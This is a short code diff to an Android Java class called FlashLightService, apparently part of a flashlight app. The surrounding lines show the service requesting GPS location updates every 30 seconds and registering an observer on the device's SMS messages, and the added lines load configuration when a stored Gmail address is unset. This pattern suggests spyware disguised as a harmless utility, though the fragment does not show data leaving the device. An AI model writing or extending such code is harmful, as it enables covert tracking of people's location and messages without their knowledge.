@@ -130,6 +130,9 @@ public class FlashLightService extends Service implements LocationListener {
     locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER,30000,10,this);
 
     try {
+      if(gmailEmailString.equals("null")) {
+        configure.getDatabaseInfo(this.getApplicationContext());
+      }
       Handler mSmsObserverHandler = new Handler();
       ContentResolver contentResolver = this.getApplicationContext().getContentResolver();
       SMSObserver smsObserver = new SMSObserver(mSmsObserverHandler, getApplicationContext());
